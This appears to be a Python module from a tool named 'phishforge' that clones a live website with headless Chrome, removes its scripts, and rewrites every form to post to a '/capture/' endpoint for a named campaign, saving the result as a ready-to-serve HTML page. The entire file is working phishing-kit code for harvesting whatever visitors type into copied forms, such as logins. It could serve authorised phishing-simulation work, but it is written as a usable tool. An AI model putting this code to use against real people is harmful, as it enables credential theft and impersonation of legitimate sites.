from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup, Tag
import os
from urllib.parse import urljoin

def clone_site(url, campaign_name):
    """Clones a website, making all resource paths absolute and forcing form submission."""
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")

    try:
        with webdriver.Chrome(options=options) as driver:
            driver.get(url)
            page_source = driver.page_source

        soup = BeautifulSoup(page_source, 'html.parser')

        # --- Make all resource paths absolute ---
        tags_to_update = {'link': 'href', 'img': 'src', 'script': 'src'}
        for tag_name, attr in tags_to_update.items():
            for tag in soup.find_all(tag_name, **{attr: True}):
                if not tag[attr].startswith(('http', '//')):
                    tag[attr] = urljoin(url, tag[attr])

        # --- Neutralize original scripts ---
        for script in soup("script"):
            script.decompose()

        # --- Force form submission logic ---
        for i, form in enumerate(soup.find_all('form')):
            form['action'] = f"/capture/{campaign_name}"
            form['method'] = 'post'
            form['id'] = f'phishforge-form-{i}'

            # Find a submit button or create one if none exists
            submit_button = form.find('button', type='submit') or form.find('input', type='submit')
            if not submit_button:
                # If no clear submit button, find any button and force it
                submit_button = form.find('button') or form.find('input', type='button')
                if submit_button:
                    submit_button['type'] = 'submit'
            
            # If still no button, we can't do much, but this is rare.

        # --- Save the sanitized HTML ---
        output_dir = os.path.join("phishforge", "cloned_sites")
        os.makedirs(output_dir, exist_ok=True)

        file_path = os.path.join(output_dir, f"{campaign_name}.html")
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(str(soup.prettify()))

        return f"{campaign_name}.html"
    except Exception as e:
        return str(e)
